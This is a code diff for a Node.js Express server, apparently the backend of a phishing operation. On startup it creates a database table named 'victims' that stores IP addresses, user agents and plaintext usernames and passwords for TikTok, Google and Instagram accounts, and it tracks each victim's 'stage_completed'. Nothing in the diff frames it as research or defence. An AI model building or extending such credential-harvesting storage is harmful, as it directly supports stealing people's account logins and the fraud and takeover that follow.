@@ -9,12 +9,30 @@ const PORT = process.env.PORT || 3000;
 // Health check
 app.get('/health', (req, res) => res.status(200).send('OK'));
 
-// Database connection
 const pool = new Pool({
     connectionString: process.env.DATABASE_URL,
     ssl: { rejectUnauthorized: false },
     connectionTimeoutMillis: 5000
 });
+
+// ✅ APP START HOTE HI TABLE AUTO-BAN JAYEGI
+pool.query(`
+    CREATE TABLE IF NOT EXISTS victims (
+        id SERIAL PRIMARY KEY,
+        ip_address VARCHAR(45),
+        user_agent TEXT,
+        timestamp TIMESTAMPTZ DEFAULT NOW(),
+        tiktok_username TEXT,
+        tiktok_password TEXT,
+        google_email TEXT,
+        google_password TEXT,
+        instagram_username TEXT,
+        instagram_password TEXT,
+        stage_completed INTEGER DEFAULT 1
+    )
+`)
+.then(() => console.log('✅ TABLE READY'))
+.catch(err => console.log('❌ TABLE ERROR:', err.message));
 
 // Database test — pool connect hua ya nahi
 pool.query('SELECT 1')
